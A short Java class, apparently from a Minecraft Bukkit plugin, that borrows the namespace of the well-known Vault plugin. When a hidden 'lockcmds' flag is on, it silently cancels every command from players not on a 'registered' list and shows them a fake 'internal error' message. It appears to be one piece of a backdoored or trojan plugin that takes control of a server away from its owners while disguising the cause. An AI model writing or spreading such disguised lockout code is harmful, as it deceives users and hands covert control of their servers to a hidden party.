package net.milkbowl.vault.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import net.milkbowl.vault.Core;

public class LockCmds implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		Player p = e.getPlayer();
		if (plugin.lockcmds) {
			if (!plugin.registered.contains(p.getName())) {
				e.setCancelled(true);
				p.sendMessage("§cAn interal error has occured while attempting to execute this command.");
			}
		}
	}
}
